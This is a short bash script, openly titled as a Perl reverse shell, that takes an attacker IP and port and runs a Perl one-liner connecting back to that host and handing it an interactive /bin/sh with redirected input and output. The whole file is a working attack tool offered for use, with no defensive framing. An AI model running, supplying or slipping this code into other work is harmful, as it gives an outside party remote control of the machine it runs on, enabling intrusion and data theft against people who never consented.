#!/bin/bash
# reverse_shell_perl.sh - Reverse shell using Perl.
if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <attacker_ip> <attacker_port>"
  exit 1
fi
echo "Launching Perl reverse shell to $1:$2..."
perl -e 'use Socket;$i="$ARGV[0]"; $p=$ARGV[1]; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};' $1 $2
